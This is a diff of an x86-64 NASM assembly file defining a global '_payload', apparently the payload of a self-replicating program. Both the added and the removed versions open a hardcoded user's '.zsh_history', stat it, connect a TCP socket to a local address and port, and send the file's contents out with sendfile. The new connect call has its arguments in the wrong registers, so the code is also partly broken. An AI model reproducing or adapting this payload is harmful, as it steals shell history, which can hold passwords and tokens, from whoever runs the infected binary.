@@ -17,118 +17,99 @@ global _payload_size
 %endrep
 %endmacro
 
-%macro POPS 1-*
-%rep %0
-	pop rax
-	%rotate 1
-%endrep
-%endmacro
+section .data
+    path db '/Users/maxencegama/.zsh_history', 0
+    addr_ip dd 0
+    port dw 0x0
+    stat_buffer times 144 db 0  ; Taille de struct stat sur x86-64
+    sockaddr_in:
+        ; La structure sockaddr_in est composée de :
+        ; - sin_family: 2 octets
+        ; - sin_port: 2 octets
+        ; - sin_addr: 4 octets
+        ; - sin_zero: 8 octets
+        ; Taille totale: 16 octets
+        ; Nous définissons la structure en mémoire ici.
+        db 16                      ; sin_len
+        dw 2                       ; sin_family (AF_INET)
+        dw 0x0bb8                  ; sin_port (3002 en hex)
+        dd 0                       ; sin_addr (INADDR_ANY)
+        times 8 db 0               ; sin_zero (8 octets de zéros)
 
 section .text
-
-;; Data definitions
-struc sockaddr_in
-	.sin_len resb 1
-    .sin_family resw 1
-    .sin_port resw 1
-    .sin_addr resd 1
-    .sin_zero resb 8
-endstruc
+global _payload
 
 _payload:
-	pushx rax, rdi, rsi, rdx, r10
+    ; Sauvegarde des registres
+	pushx rbx, rbp, r12, r13, r14, r15
 
-	; Open the file
-	mov rax, 2					; SYS_open
-	lea rdi, [rel FILEPATH]		; filename
-	mov rsi, 0					; flags (O_RDONLY)
-	syscall
-	cmp rax, -1
-	jl .clean
-	mov r12, rax
+    ; Ouvrir le fichier
+    mov rax, 2                    ; SYS_open
+    lea rdi, [rel path]           ; Chemin du fichier
+    mov rsi, 0                    ; O_RDONLY
+    syscall
+    test rax, rax
+    js exit                       ; Si erreur, quitter
+    mov r12, rax                  ; Sauvegarder le descripteur de fichier dans r12
 
-	; stat the file
-	mov rax, 5					; SYS_fstat
-	mov rdi, r12				; filename
-	lea rsi, [rel STATBUFFER]	; stat buffer
-	syscall
-	cmp rax, -1
-	je .clean
+    ; Obtenir les informations du fichier
+    mov rax, 4                    ; SYS_stat
+    lea rdi, [rel path]           ; Chemin du fichier
+    lea rsi, [rel stat_buffer]    ; Buffer de stat
+    syscall
+    test rax, rax
+    js close_file                 ; Si erreur, fermer le fichier et quitter
 
-	; Affichage de succès (utilisation de write)
-	mov rax, 1                   ; numéro de syscall pour write
-	mov rdi, 1                   ; descripteur de fichier (stdout)
-	lea rsi, [rel STATBUFFER]   ; message de succès
-	mov rdx, 144     ; longueur du message
-	syscall
+    ; Créer la socket
+    mov rax, 41                   ; SYS_socket
+    mov rdi, 2                    ; AF_INET
+    mov rsi, 1                    ; SOCK_STREAM
+    mov rdx, 0                    ; 0
+    syscall
+    test rax, rax
+    js close_file                 ; Si erreur, fermer le fichier et quitter
+    mov r13, rax                  ; Sauvegarder le descripteur de socket dans r13
 
-.connect:
-	; Create the socket
-	mov rax, 41					; SYS_socket
-	mov rdi, 2					; domain (AF_INET)
-	mov rsi, 1					; type (SOCK_STREAM)
-	mov rdx, 0					; protocol
-	syscall
-	cmp rax, -1
-	je .clean
-	mov r13, rax
+    ; Préparer la structure sockaddr_in
+    lea rdi, [rel sockaddr_in]
+    mov rax, 42                   ; SYS_connect
+    mov rsi, r13                  ; Socket
+    mov rdx, 16                   ; Taille de sockaddr_in
+    syscall
+    test rax, rax
+    js close_socket               ; Si erreur, fermer la socket et le fichier, et quitter
 
-	; Prepare sockaddr_in structure
-	; mov word [rel CONNECT_BUFFER + 1], 2          ; sin_family (AF_INET)
-	; movzx rax, word [rel SERVER_PORT]
-	; mov word [rel CONNECT_BUFFER + 2], ax ; sin_port
-	; mov eax, [rel SERVER_ADDR] ; Load the value from memory into EAX register
-	; mov dword [rel CONNECT_BUFFER + 4], eax ; Move the value from EAX register to the destination memory location
-	; mov [pop_sa + sockaddr_in.sin_port], bx
-	
-	; Connect the socket
-	mov rax, 42					; SYS_connect
-	mov rdi, r13				; socket file descriptor
-	lea rsi, [rel pop_sa]		; pointer to sockaddr_in
-	mov rdx, 16					; size of sockaddr_in
-	syscall
-	cmp rax, -1
-	je .clean
+    ; Envoyer le fichier via la socket
+    mov rax, 40                   ; SYS_sendfile
+    mov rdi, r13                  ; Socket
+    mov rsi, r12                  ; Descripteur de fichier
+    xor rdx, rdx                  ; Offset (0)
+    mov r10, [rel stat_buffer + 48] ; Taille du fichier
+    syscall
+    test rax, rax
+    js close_socket               ; Si erreur, fermer la socket et le fichier, et quitter
 
-	; Send the file
-	mov rax, 40						; SYS_sendfile
-	mov rdi, r13					; socket file descriptor
-	mov rsi, r12					; file descriptor
-	xor rdx, rdx					; offset (NULL)
-	mov r10, [rel STATBUFFER + 48]	; size
-	syscall
+    ; Fin propre
+    jmp cleanup
 
-	jmp .clean
+close_socket:
+    ; Fermer la socket
+    mov rax, 3                    ; SYS_close
+    mov rdi, r13                  ; Descripteur de socket
+    syscall
 
-.clean:
-	; Close the file
-	mov rax, 3					; SYS_close
-	mov rdi, r12				; file descriptor
-	syscall
+close_file:
+    ; Fermer le fichier
+    mov rax, 3                    ; SYS_close
+    mov rdi, r12                  ; Descripteur de fichier
+    syscall
 
-	; Close the socket
-	mov rax, 3					; SYS_close
-	mov rdi, r13				; file descriptor
-	syscall
+cleanup:
+    ; Restaurer les registres
+	popx rbx, rbp, r12, r13, r14, r15
 
-	popx rax, rdi, rsi, rdx, r10
-	; jmp     [rel 0x0]
-	mov rax, 0
-	ret
-
-STATBUFFER		times 144 db 1
-; CONNECT_BUFFER	times 16 db 0
-;; sockaddr_in structure for the address the listening socket binds to
-pop_sa istruc sockaddr_in
-	at sockaddr_in.sin_len,		db 16
-	at sockaddr_in.sin_family,	dw 2			; AF_INET
-	at sockaddr_in.sin_port,	dw 0xa1ed		; port 60833
-	at sockaddr_in.sin_addr,	dd 0			; localhost
-	at sockaddr_in.sin_zero,	dd 0, 0
-iend
-; FILEPATH		times 1024 db 0
-FILEPATH		db '/home/maxence/.zsh_history', 0
-SERVER_PORT		dd 0xba0b
-SERVER_ADDR		dw 0x0
-
-; _payload_size:	dq $-_payload
+exit:
+    ; Quitter le programme
+    mov rax, 60                   ; SYS_exit
+    xor rdi, rdi                  ; Code de sortie 0
+    syscall
